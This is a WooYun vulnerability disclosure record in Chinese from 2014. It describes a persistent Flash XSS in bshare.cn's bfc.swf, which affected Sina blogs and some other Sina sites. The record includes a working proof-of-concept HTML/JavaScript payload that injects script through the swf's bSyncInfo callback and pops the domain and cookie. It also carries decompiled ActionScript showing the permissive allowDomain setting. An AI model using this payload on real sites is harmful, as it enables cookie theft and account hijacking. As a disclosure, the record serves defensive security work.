{"id": 1527, "wybug_id": "wooyun-2014-069590", "wybug_title": "新浪博客Flash XSS Rootkit(博客通杀+部分其他站点)", "wybug_corp": "新浪", "wybug_author": "iv4n", "wybug_date": "2014-07-25 11:49", "wybug_open_date": "2014-09-08 11:50", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向公众公开  简要描述： bshare.cn的Flash LSO导致的漏洞，新浪算躺枪，不过对新浪来说危害太大 详细说明：  搜索到“XXX”关键字到了新浪博客，突然弹出了cookie，吓了一跳。仔细一看，原来是bshare.cn的一个flash导致的，才想到前段时间审核某外包应用的时候发现的bshare.cn的LSO漏洞，当时果断掐掉了这货，没想到新浪也用了这货，纯属意外，原理和前面发的那个Flash LSO的一样：http://wooyun.org/bugs/wooyun-2014-065197   漏洞证明：  访问：http://1v4n.sinaapp.com/poc/bfc.html\n<object id=\"bshareFS\" type=\"application/x-shockwave-flash\" data=\"http://static.bshare.cn/flash/bfc.swf\" width=\"0\" height=\"0\"><param name=\"movie\" value=\"http://static.bshare.cn/flash/bfc.swf\"><param name=\"allowScriptAccess\" value=\"always\"><param name=\"allowNetworking\" value=\"all\"></object><script>function set(){\tdocument.getElementById('bshareFS').bSyncInfo('\\\\\";alert(document.domain+document.cookie);//a');}//function get(){aa.getlso();}setTimeout(\"set()\",2000);//setTimeout(\"get()\",2100);</script>\n再访问：http://finance.sina.com.cn/focus/ourtimes_zxl/ 或者任意一篇博客。简单看了下，博客是通杀，其他也没心思找了。说明下：如果原来访问过博客之类的，需要清理一下Flash本地存储，再走上面流程，才能触发。具体原因看代码吧：\npublic function syncInfo(param1:String = \"\", param2:String = \"bshare\", param3:Boolean = false) : String        {            var _loc_4:SharedObject = null;            try            {                _loc_4 = SharedObject.getLocal(\"buzz-\" + param2);                if (_loc_4.data.hasOwnProperty(\"bInfo\") && _loc_4.data.bInfo)                {                    if (param1)                    {                        if (_loc_4.data.bInfo !== param1)                        {                            if (param3)                            {                                _loc_4.data.bInfo = param1;                                _loc_4.flush();                            }                            else                            {                                return _loc_4.data.bInfo;                            }                        }                    }                    else                    {                        return _loc_4.data.bInfo;                    }                }                else if (param1)                {                    _loc_4.data.bInfo = param1;                    _loc_4.flush();                }            }            catch (e:Error)            {            }            return \"\";        }// end function        function frame1()        {            Security.allowDomain(\"*\");            Security.allowInsecureDomain(\"*\");            addEventListener(Event.ENTER_FRAME, this.registerExternalCallbacks);            return;        }// end function\n\n\n\n\n   修复方案：  能不用别人的就不要用别人的，一不小心露了菊花   版权声明：转载请注明来源 iv4n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-07-28 17:29 厂商回复： 感谢对新浪安全的支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}